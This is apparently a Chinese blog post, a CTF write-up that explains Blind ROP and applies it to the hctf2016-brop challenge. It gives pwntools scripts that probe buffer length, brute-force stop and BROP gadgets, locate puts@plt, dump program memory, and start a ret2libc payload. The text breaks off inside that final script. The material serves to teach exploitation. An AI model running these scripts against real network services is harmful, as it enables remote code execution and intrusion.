<p>这里需要说明执行 <code>strcmp</code> 的时候，rdx 会被设置为将要被比较的字符串的长度，所以我们可以找到 strcmp 函数，从而来控制 rdx。</p>
</blockquote>
</li>
</ul>
</li>
<li><p>那么接下来的问题，我们就可以分为两项</p>
<ul>
<li>寻找 gadgets<ul>
<li>控制参数<code>rdi</code>和<code>rsi</code></li>
</ul>
</li>
<li>寻找 PLT 表<ul>
<li>write 入口</li>
<li>strcmp 入口</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>Build the exploit</p>
<ul>
<li>利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。</li>
</ul>
</li>
</ul>
<h4 id="BROP-gadgets"><a href="#BROP-gadgets" class="headerlink" title="BROP gadgets"></a>BROP gadgets</h4><blockquote>
<p>从不同偏移处开始反汇编，可以得到对不同<code>register</code>的控制！！！</p>
<p>最关键的是<code>pop rdi</code>和<code>rsi</code>，设计64位的头两个参数</p>
</blockquote>
<p><img src="/2022/06/16/pwn/brop/brop_gadget.png" alt="brop_gadget"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disassemble 0x4007ba,0x4007c5</span><br><span class="line">Dump of assembler code from 0x4007ba to 0x4007c5:</span><br><span class="line">   0x00000000004007ba &lt;__libc_csu_init+90&gt;:	pop    rbx</span><br><span class="line">   0x00000000004007bb &lt;__libc_csu_init+91&gt;:	pop    rbp</span><br><span class="line">   0x00000000004007bc &lt;__libc_csu_init+92&gt;:	pop    r12</span><br><span class="line">   0x00000000004007be &lt;__libc_csu_init+94&gt;:	pop    r13</span><br><span class="line">   0x00000000004007c0 &lt;__libc_csu_init+96&gt;:	pop    r14</span><br><span class="line">   0x00000000004007c2 &lt;__libc_csu_init+98&gt;:	pop    r15</span><br><span class="line">   0x00000000004007c4 &lt;__libc_csu_init+100&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">pwndbg&gt; disassemble 0x4007ba+0x7,0x4007c5</span><br><span class="line">Dump of assembler code from 0x4007c1 to 0x4007c5:</span><br><span class="line">   0x00000000004007c1 &lt;__libc_csu_init+97&gt;:	pop    rsi</span><br><span class="line">   0x00000000004007c2 &lt;__libc_csu_init+98&gt;:	pop    r15</span><br><span class="line">   0x00000000004007c4 &lt;__libc_csu_init+100&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">pwndbg&gt; disassemble 0x4007ba+0x9,0x4007c5</span><br><span class="line">Dump of assembler code from 0x4007c3 to 0x4007c5:</span><br><span class="line">   0x00000000004007c3 &lt;__libc_csu_init+99&gt;:	pop    rdi</span><br><span class="line">   0x00000000004007c4 &lt;__libc_csu_init+100&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>



<h4 id="stop-gadgets"><a href="#stop-gadgets" class="headerlink" title="stop gadgets"></a>stop gadgets</h4><blockquote>
<p>所谓<code>stop gadget</code>一般指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。之所以要寻找 <code>stop gadgets</code>，是因为当我们猜到某个 gadgtes 后，如果我们仅仅是将其布置在栈上，由于执行完这个 gadget 之后，程序还会跳到栈上的下一个地址。如果该地址是非法地址，那么程序就会 crash。这样的话，在攻击者看来程序只是单纯的 crash 了</p>
</blockquote>
<h5 id="定义栈上的三种地址Probe"><a href="#定义栈上的三种地址Probe" class="headerlink" title="定义栈上的三种地址Probe"></a>定义栈上的三种地址Probe</h5><ul>
<li>Probe<ul>
<li>探针，也就是我们想要探测的代码地址。一般来说，都是 64 位程序，可以直接从 0x400000 尝试，如果不成功，有可能程序开启了 PIE 保护，再不济，就可能是程序是 32 位了。。这里我还没有特别想明白，怎么可以快速确定远程的位数。</li>
</ul>
</li>
<li>Stop<ul>
<li>不会使得程序崩溃的 stop gadget 的地址。</li>
</ul>
</li>
<li>Trap<ul>
<li>可以导致程序崩溃的地址</li>
</ul>
</li>
</ul>
<h4 id="stack-探测"><a href="#stack-探测" class="headerlink" title="stack 探测"></a>stack 探测</h4><ul>
<li>我们可以通过在栈上摆放不同顺序的 <strong>Stop</strong> 与 <strong>Trap</strong> 从而来识别出正在执行的指令。因为执行 Stop 意味着程序不会崩溃，执行 Trap 意味着程序会立即崩溃。这里给出几个例子<ul>
<li><code>probe,stop,traps(traps,traps,...)</code><ul>
<li>我们通过程序崩溃与否 (如果程序在 probe 处直接崩溃怎么判断) 可以找到不会对栈进行 pop 操作的 gadget，如<ul>
<li>ret</li>
<li>xor eax,eax; ret</li>
</ul>
</li>
</ul>
</li>
<li><code>probe,trap,stop,traps</code><ul>
<li>我们可以通过这样的布局找到<strong>只是弹出一个栈变量</strong>的 gadget。如<ul>
<li>pop rax; ret</li>
<li>pop rdi; ret</li>
</ul>
</li>
</ul>
</li>
<li><code>probe, trap, trap, trap, trap, trap, trap, stop, traps</code><ul>
<li>我们可以通过这样的布局来找到弹出 6 个栈变量的 gadget，也就是与 brop gadget 相似的 gadget。这里感觉原文是有问题的，比如说如果遇到了只是 pop 一个栈变量的地址，其实也是不会崩溃的… …这里一般来说会遇到两处比较有意思的地方<ul>
<li><code>plt</code> 处不会崩，，</li>
<li><code>_start</code> 处不会崩，相当于程序重新执行。</li>
<li>需要注意的是向 BROP 这样的一下子弹出 6 个寄存器的 gadgets，程序中并不经常出现。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>需要注意的是 <code>probe</code> 可能是一个 stop gadget，我们得去检查一下，怎么检查呢？我们只需要让后面所有的内容变为 trap 地址即可。因为如果是 stop gadget 的话，程序会正常执行，否则就会崩溃。看起来似乎很有意思.</li>
</ul>
<h4 id="寻找-plt"><a href="#寻找-plt" class="headerlink" title="寻找 plt"></a>寻找 plt</h4><blockquote>
<p>如下图所示，程序的 plt 表具有比较规整的结构，每一个 plt 表项都是 <code>16</code> 字节。而且，在每一个表项的 <code>6</code> 字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的 got 地址进行解析。</p>
</blockquote>
<p><img src="/2022/06/16/pwn/brop/brop_plt.png" alt="brop_plt"></p>
<blockquote>
<p>对于大多数 plt 调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了<strong>一系列的长度为 16 的没有使得程序崩溃的代码段</strong>，那么我们有一定的理由相信我们遇到了 <code>plt</code> 表。除此之外，我们还可以通过前后偏移 6 字节，来判断我们是处于 plt 表项中间还是说处于开头。</p>
</blockquote>
<h4 id="控制-rdx"><a href="#控制-rdx" class="headerlink" title="控制 rdx"></a>控制 rdx</h4><blockquote>
<ul>
<li><p>并不是所有的程序都会调用 strcmp 函数</p>
</li>
<li><p>这里给出程序中使用 strcmp 函数的情况。</p>
</li>
<li><p>定义以下两种地址</p>
<ul>
<li>readable，可读的地址。</li>
<li>bad, 非法地址，不可访问，比如说 0x0。</li>
</ul>
</li>
<li><p>如果控制传递的参数为这两种地址的组合，会出现以下四种情况</p>
<ul>
<li>strcmp(bad,bad)</li>
<li>strcmp(bad,readable)</li>
<li>strcmp(readable,bad)</li>
<li>strcmp(readable,readable)</li>
</ul>
<p>只有最后一种格式，程序才会正常执行。</p>
</li>
<li><p>没有 PIE 保护的时候，64 位程序的 ELF 文件的 <code>0x400000</code> 处有 7 个非零字节。</p>
</li>
</ul>
</blockquote>
<h4 id="寻找输出函数"><a href="#寻找输出函数" class="headerlink" title="寻找输出函数"></a>寻找输出函数</h4><blockquote>
<p>寻找输出函数既可以寻找 write，也可以寻找 puts。一般现先找 puts 函数。不过这里为了介绍方便，先介绍如何寻找 write。</p>
</blockquote>
<h5 id="寻找write-plt"><a href="#寻找write-plt" class="headerlink" title="寻找write@plt"></a>寻找write@plt</h5><p>当我们可以控制 write 函数的三个参数的时候，我们就可以再次遍历所有的 plt 表，根据 write 函数将会输出内容来找到对应的函数。需要注意的是，这里有个比较麻烦的地方在于我们需要找到文件描述符的值。一般情况下，我们有两种方法来找到这个值</p>
<ul>
<li>使用 rop chain，同时使得每个 rop 对应的文件描述符不一样</li>
<li>同时打开多个连接，并且我们使用相对较高的数值来试一试。</li>
</ul>
<p>需要注意的是</p>
<ul>
<li>linux 默认情况下，一个进程最多只能打开 1024 个文件描述符。</li>
<li>posix 标准每次申请的文件描述符数值总是当前最小可用数值。</li>
</ul>
<p>当然，我们也可以选择寻找 puts 函数。</p>
<h5 id="寻找puts-plt"><a href="#寻找puts-plt" class="headerlink" title="寻找puts@plt"></a>寻找puts@plt</h5><p>寻找 <code>puts</code> 函数 (这里我们寻找的是<code>plt</code>)，我们自然需要控制 <code>rdi</code> 参数，在上面，我们已经找到了 <code>brop gadget</code>。那么，我们根据 <code>brop gadget</code> 偏移 9 可以得到相应的 <code>gadgets</code>（由 ret2libc_csu_init 中后续可得）。同时在程序还没有开启 PIE 保护的情况下，0x400000 处为 ELF 文件的头部，其内容为 \ x7fELF。所以我们可以根据这个来进行判断。一般来说，其 payload 如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*length +p64(pop_rdi_ret)+p64(<span class="number">0x400000</span>)+p64(addr)+p64(stop_gadget)</span><br></pre></td></tr></table></figure>



<h2 id="writeup-brop"><a href="#writeup-brop" class="headerlink" title="writeup_brop"></a>writeup_brop</h2><blockquote>
<p>采取题目是<code>hctf2016-brop</code>，原题目地址：<a href="https://github.com/Ganliber/pwn/tree/main/pwn-challenge/questions/stack/ROP%202/brop/hctf2016-brop">hctf2016-brop</a></p>
</blockquote>
<h3 id="确定栈溢出长度"><a href="#确定栈溢出长度" class="headerlink" title="确定栈溢出长度"></a>确定栈溢出长度</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getbuffer_len</span>():</span><br><span class="line">  i=<span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">      io.recvuntil(<span class="string">b&#x27;WelCome my friend,Do you know password?\n&#x27;</span>)</span><br><span class="line">      io.send(i*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">      output = io.recv()</span><br><span class="line">      io.close()</span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> output.startswith(<span class="string">b&#x27;No password&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    buffer_len = getbuffer_len()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The length of buffer overflow is &quot;</span>,buffer_len)</span><br></pre></td></tr></table></figure>

<p>最终得到<code>buffer</code>长度</p>
<img src="brop_buffer_len.png" alt="brop_buffer_len" style="zoom:50%;" />



<p>首先确定，栈溢出的长度为 72。同时，根据回显信息可以发现程序并没有开启 canary 保护，否则，就会有相应的报错内容。所以我们不需要执行 stack reading。</p>
<h3 id="寻找-stop-gadgets"><a href="#寻找-stop-gadgets" class="headerlink" title="寻找 stop gadgets"></a>寻找 stop gadgets</h3><blockquote>
<p>通常addr初始值设为<code>0x400000</code>，但这个题目我为了节约时间就改成<code>0x4006b0</code>，通常在<code>_start</code>入口处前后会有<code>stop_gadgets</code></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_stop_addr</span>(<span class="params">length</span>):</span><br><span class="line">  addr = <span class="number">0x4006b0</span>  <span class="comment"># No PIE</span></span><br><span class="line">  <span class="keyword">while</span> <span class="number">1</span> :</span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">      io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">      io.recvuntil(<span class="string">b&#x27;WelCome my friend,Do you know password?\n&#x27;</span>)</span><br><span class="line">      payload = <span class="string">b&#x27;a&#x27;</span>*length + p64(addr)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;Temporary address is 0x%x&#x27;</span>%(addr))</span><br><span class="line">      io.sendline(payload)</span><br><span class="line">      content = io.recv()  <span class="comment"># if recv() doesn&#x27;t cause crash, it means that it is a stop gadgets</span></span><br><span class="line">      io.close()  <span class="comment"># sometimes _start will not cause crash</span></span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;One success addr: 0x%x&#x27;</span> % (addr))</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;When the addr is found successfully, you will recieve the message from the remote: &#x27;</span>,content)</span><br><span class="line">      <span class="keyword">return</span> addr</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">      addr += <span class="number">1</span></span><br><span class="line">      io.close()</span><br></pre></td></tr></table></figure>

<p>结合中间输出可以让结果有迹可循一点，次数找到了<code>0x4006b6</code>，为了找到开始地址，可以输出程序没有崩溃时的接收结果，看是否与程序开始时候的提示一致。</p>
<img src="brop_stop_gadgets.png" alt="brop_stop_gadgets" style="zoom:38%;" />

<h3 id="寻找-brop-gadgets"><a href="#寻找-brop-gadgets" class="headerlink" title="寻找 brop gadgets"></a>寻找 brop gadgets</h3><blockquote>
<p>此处是为了找到<code>__libc_csu_init</code>的末尾那一段重要部分，即</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] </span><br><span class="line">pop rbx, pop rbp, pop r12, pop r13, pop r14, pop r15, ret</span><br><span class="line">[*] + 0x7 </span><br><span class="line">pop rsi, pop r15, ret</span><br><span class="line">[*] + 0x9</span><br><span class="line">pop rdi, ret</span><br></pre></td></tr></table></figure>

<p>需要借助</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt; probe, trap, trap, trap, trap, trap, trap, stop, traps</span><br><span class="line"></span><br><span class="line">[*] probe : testing pointer.</span><br><span class="line">[*] traps : (trap, trap,...), you can add <span class="number">10</span> traps or more to avoid the special situations.</span><br><span class="line">[*] Sometimes <span class="title function_">p64</span><span class="params">(<span class="number">0</span>)</span> is a good example of trap.</span><br></pre></td></tr></table></figure>

<p>来识别</p>
</blockquote>
<p>识别<code>brop gadgets</code>代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_brop_gadget</span>(<span class="params">length, stop_addr, addr</span>):</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;WelCome my friend,Do you know password?\n&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*length + p64(addr) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(stop_addr) + p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    content = io.recv()</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="comment"># stop gadget returns memory</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> content.startswith(<span class="string">b&#x27;WelCome&#x27;</span>): &lt;---注意这里判断的必须是 <span class="built_in">bytes</span> 类型, 所以需要在string头加一个b</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_brop_gadget</span>(<span class="params">length, addr</span>):</span><br><span class="line">  <span class="string">&quot;&quot;&quot; Just for checking brop possible gadget &quot;&quot;&quot;</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;WelCome my friend,Do you know password?\n&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*length + p64(addr) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>*<span class="number">10</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brop_gadget</span>(<span class="params">length, stop_gadget, init_addr</span>):</span><br><span class="line">  addr = init_addr</span><br><span class="line">  <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line">    <span class="keyword">if</span> get_brop_gadget(length, stop_gadget, addr):</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;possible brop gadget: 0x%x&#x27;</span> % (addr))</span><br><span class="line">      <span class="keyword">if</span> check_brop_gadget(length, addr):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;success brop gadget: 0x%x&#x27;</span> % (addr))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    addr += <span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> addr</span><br></pre></td></tr></table></figure>



<h3 id="确定-addr-gt-puts-plt"><a href="#确定-addr-gt-puts-plt" class="headerlink" title="确定 addr-&gt;puts@plt"></a>确定 addr-&gt;puts@plt</h3><blockquote>
<h4 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h4><ol>
<li>对于大多数 plt 调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了一系列的长度为 16 的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了 plt 表。除此之外，我们还可以通过前后偏移 6 字节，来判断我们是处于 plt 表项中间还是说处于开头。</li>
<li>寻找 puts 函数 (这里我们寻找的是<code>plt</code>)，我们自然需要控制 <code>rdi</code> 参数，在上面，我们已经找到了 <code>brop gadget</code>。那么，我们根据 <code>brop gadget</code> 偏移 <code>0x9</code> 可以得到相应的 <code>gadgets</code>（由 ret2libc_csu_init 中后续可得）。同时在程序还没有开启 PIE 保护的情况下，<code>0x400000</code> 处为 ELF 文件的头部，其内容为 <code>\ x7fELF</code>。所以我们可以根据这个来进行判断。一般来说，其 payload 如下</li>
</ol>
</blockquote>
<ol>
<li><p>关于<code>rdi_ret</code>的获取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rdi_ret = brop_gadget_addr + <span class="number">0x9</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>关于<code>payload</code></p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_puts_addr</span>(<span class="params">length, rdi_ret, stop_gadget</span>):</span><br><span class="line">  addr = <span class="number">0x400000</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line">    io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span>*length + p64(rdi_ret) + p64(<span class="number">0x400000</span>) + p64(addr) + p64(stop_gadget)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      content = io.recv()</span><br><span class="line">      <span class="keyword">if</span> content.startswith(<span class="string">b&#x27;\x7fELF&#x27;</span>):  </span><br><span class="line">        <span class="comment"># remenber add &#x27;b&#x27; to your string</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Find puts@plt addr: 0x%x&#x27;</span> % (addr))</span><br><span class="line">        <span class="keyword">return</span> addr</span><br><span class="line">      io.close()</span><br><span class="line">      addr += <span class="number">16</span>   &lt;------!!! 按照<span class="number">16</span>的倍数迭代查找,避免从中间执行编译成多个代码造成结果不唯一的情况 </span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">      io.close()</span><br><span class="line">      addr += <span class="number">16</span></span><br></pre></td></tr></table></figure>

<p>最终得到地址为<code>0x400555</code>（不同的机器地址可能不同）</p>
<blockquote>
<p>借此可以确定在泄漏<code>puts@got</code>地址后找到<code>puts</code>的真正的地址，进而泄漏<code>libc</code>的版本</p>
</blockquote>
<p><strong>此图已经改变</strong></p>
<p><img src="/2022/06/16/pwn/brop/brop_puts@plt.png" alt="brop_puts@plt"></p>
<p>查看真正的puts@plt的地址发现与找到的不一致</p>
<p>原因如下, <code>gdb brop</code>（上帝视角）查看</p>
<p>发现实际上若从<code>0x400555</code>开始，其还是会滑向<code>puts@plt</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disassemble <span class="number">0x400555</span>, <span class="number">0x400590</span></span><br><span class="line">Dump of assembler code <span class="keyword">from</span> <span class="number">0x400555</span> to <span class="number">0x400590</span>:</span><br><span class="line">   <span class="number">0x0000000000400555</span>:	add    bh,bh</span><br><span class="line">   <span class="number">0x0000000000400557</span>:	<span class="keyword">and</span>    eax,<span class="number">0x200ab4</span></span><br><span class="line">   <span class="number">0x000000000040055c</span>:	nop    DWORD PTR [rax+<span class="number">0x0</span>]</span><br><span class="line">   <span class="number">0x0000000000400560</span> &lt;puts@plt+<span class="number">0</span>&gt;:	jmp    QWORD PTR [rip+<span class="number">0x200ab2</span>]        <span class="comment"># 0x601018 &lt;puts@got.plt&gt;</span></span><br><span class="line">   <span class="number">0x0000000000400566</span> &lt;puts@plt+<span class="number">6</span>&gt;:	push   <span class="number">0x0</span></span><br><span class="line">   <span class="number">0x000000000040056b</span> &lt;puts@plt+<span class="number">11</span>&gt;:	jmp    <span class="number">0x400550</span></span><br><span class="line">   <span class="number">0x0000000000400570</span> &lt;setbuf@plt+<span class="number">0</span>&gt;:	jmp    QWORD PTR [rip+<span class="number">0x200aaa</span>]        <span class="comment"># 0x601020 &lt;setbuf@got.plt&gt;</span></span><br><span class="line">   <span class="number">0x0000000000400576</span> &lt;setbuf@plt+<span class="number">6</span>&gt;:	push   <span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040057b</span> &lt;setbuf@plt+<span class="number">11</span>&gt;:	jmp    <span class="number">0x400550</span></span><br><span class="line">   <span class="number">0x0000000000400580</span> &lt;read@plt+<span class="number">0</span>&gt;:	jmp    QWORD PTR [rip+<span class="number">0x200aa2</span>]        <span class="comment"># 0x601028 &lt;read@got.plt&gt;</span></span><br><span class="line">   <span class="number">0x0000000000400586</span> &lt;read@plt+<span class="number">6</span>&gt;:	push   <span class="number">0x2</span></span><br><span class="line">   <span class="number">0x000000000040058b</span> &lt;read@plt+<span class="number">11</span>&gt;:	jmp    <span class="number">0x400550</span></span><br></pre></td></tr></table></figure>

<p>我们可以按照<code>16</code>的倍数来进行遍历查找<code>plt</code>表！！！</p>
<h3 id="泄漏-addr-gt-puts-got"><a href="#泄漏-addr-gt-puts-got" class="headerlink" title="泄漏 addr-&gt;puts@got"></a>泄漏 addr-&gt;puts@got</h3><blockquote>
<ol>
<li>泄露 puts 函数的地址，进而获取 libc 版本，从而获取相关的 system 函数地址与 &#x2F; bin&#x2F;sh 地址，从而获取 shell</li>
<li>我们从 0x400000 开始泄露 0x1000 个字节，这已经足够包含程序的 plt 部分了，0x1000 &#x3D; 16 bytes * 256</li>
</ol>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak_unit</span>(<span class="params">length, rdi_ret, puts_plt, leak_addr, stop_gadget</span>):</span><br><span class="line">  io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span>*length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)</span><br><span class="line">  io.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">  io.sendline(payload)</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    data = io.recv()</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      data = data[:data.index(<span class="string">b&#x27;\nWelCome&#x27;</span>)]</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">      data = data</span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">b&#x27;&#x27;</span>: &lt;---------- 注意此处的判断依然是需要添加字节byte类型数据标识符b,否则会出现大量的回旋</span><br><span class="line">      data = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">  <span class="keyword">except</span> Exception:</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_memory</span>(<span class="params">length, stop_gadget, brop_gadget, rdi_ret, puts_plt, init_addr</span>):</span><br><span class="line">  result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">  addr = init_addr</span><br><span class="line">  <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">hex</span>(addr))</span><br><span class="line">    data = leak_unit(length, rdi_ret, puts_plt, addr, stop_gadget)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      result += data</span><br><span class="line">    addr += <span class="built_in">len</span>(data)</span><br><span class="line">  <span class="string">&quot;&quot;&quot; Restore the memory leaked from the exploit script &quot;&quot;&quot;</span></span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(result)</span><br></pre></td></tr></table></figure>

<ul>
<li>由此得到一个<code>4KB</code>的二进制文件</li>
</ul>
<h3 id="分析泄漏二进制内容得到addr-gt-puts"><a href="#分析泄漏二进制内容得到addr-gt-puts" class="headerlink" title="分析泄漏二进制内容得到addr-&gt;puts"></a>分析泄漏二进制内容得到addr-&gt;puts</h3><blockquote>
<p>用ida打开该文件<code>code</code>，选择<code>binary</code>模式，打开后<code>Edit</code>-&gt;<code>Segment</code>-&gt;<code>Rebase Program</code>，将程序初始地址改为<code>0x400000</code>，然后找到<code>puts@plt</code>处即偏移<code>560</code>处，按下<code>c</code>进行反汇编得到<code>puts</code>的地址为<code>0x601018</code></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">seg000:0000000000400550 loc_400550:                             ; CODE XREF: seg000:000000000040056B↓j</span><br><span class="line">seg000:0000000000400550                 push    qword ptr cs:601008h</span><br><span class="line">seg000:0000000000400556                 jmp     qword ptr cs:601010h</span><br><span class="line">seg000:000000000040055C ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:000000000040055C                 nop     dword ptr [rax+00h]</span><br><span class="line">seg000:0000000000400560                 jmp     qword ptr cs:601018h</span><br><span class="line">seg000:0000000000400566 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:0000000000400566                 push    0</span><br><span class="line">seg000:000000000040056B                 jmp     loc_400550</span><br><span class="line">seg000:000000000040056B ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>



<h3 id="栈溢出利用"><a href="#栈溢出利用" class="headerlink" title="栈溢出利用"></a>栈溢出利用</h3><blockquote>
<p>此处借助了<code>rdi_ret + 0x1</code>是<code>ret</code>指令来维护了栈平衡</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    length = <span class="number">72</span></span><br><span class="line">    stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line">    brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">    rdi_ret = <span class="number">0x4007c3</span></span><br><span class="line">    ret_addr = rdi_ret + <span class="number">0x1</span>  <span class="comment"># balance stack </span></span><br><span class="line">    puts_plt = <span class="number">0x400560</span></span><br><span class="line">    puts_got = <span class="number">0x601018</span>  <span class="comment"># where puts lies in libc</span></span><br><span class="line"></span><br><span class="line">    io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span>*length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    result = io.recvuntil(<span 